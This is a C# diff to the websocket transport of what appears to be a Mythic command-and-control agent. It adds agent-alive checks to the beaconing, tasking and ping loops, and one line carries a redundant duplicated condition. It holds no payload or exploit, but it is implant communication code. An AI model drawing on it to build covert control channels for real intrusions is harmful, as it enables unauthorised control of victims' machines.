@@ -100,7 +100,7 @@ namespace WebsocketTransport
             Agent.SetSleep(CallbackInterval, CallbackJitter);
             sendAction = () =>
             {
-                while (Client.IsAlive)
+                while (Client.IsAlive && Agent.IsAlive())
                 {
                     senderEvent.WaitOne();
                     if (senderQueue.TryDequeue(out byte[] result))
@@ -118,7 +118,7 @@ namespace WebsocketTransport
         {
             agentProcessorTask = new ST.Task(() =>
             {
-                while (Client.IsAlive)
+                while (Client.IsAlive && Agent.IsAlive())
                 {
                     Recv(MessageType.MessageResponse, delegate (IMythicMessage msg)
                     {
@@ -129,7 +129,7 @@ namespace WebsocketTransport
 
             agentPingTask = new ST.Task(() =>
             {
-                while (Client.IsAlive && !cancellationTokenSource.Token.IsCancellationRequested)
+                while (Client.IsAlive && Agent.IsAlive() && !cancellationTokenSource.Token.IsCancellationRequested)
                 {
                     Client.Ping();
                     Thread.Sleep(1000);
@@ -140,7 +140,7 @@ namespace WebsocketTransport
             agentPingTask.Start();
             agentPingTask.Wait(cancellationTokenSource.Token);
 
-            while (Agent.IsAlive())
+            while (Agent.IsAlive() && Agent.IsAlive())
             {
                 Agent.GetTaskManager().CreateTaskingMessage(delegate (TaskingMessage tm)
                 {
@@ -154,7 +154,7 @@ namespace WebsocketTransport
         {
             agentConsumerTask = new ST.Task(() =>
             {
-                while (Client.IsAlive)
+                while (Client.IsAlive && Agent.IsAlive())
                 {
                     if (!Agent.GetTaskManager().CreateTaskingMessage(delegate (TaskingMessage tm)
                     {
@@ -173,7 +173,7 @@ namespace WebsocketTransport
 
             agentPingTask = new ST.Task(() =>
             {
-                while (Client.IsAlive)
+                while (Client.IsAlive && Agent.IsAlive())
                 {
                     if (!cancellationTokenSource.Token.IsCancellationRequested)
                     {
@@ -185,7 +185,7 @@ namespace WebsocketTransport
 
             agentProcessorTask = new ST.Task(() =>
             {
-                while (Client.IsAlive)
+                while (Client.IsAlive && Agent.IsAlive())
                 {
                     Recv(MessageType.MessageResponse, delegate (IMythicMessage msg)
                     {
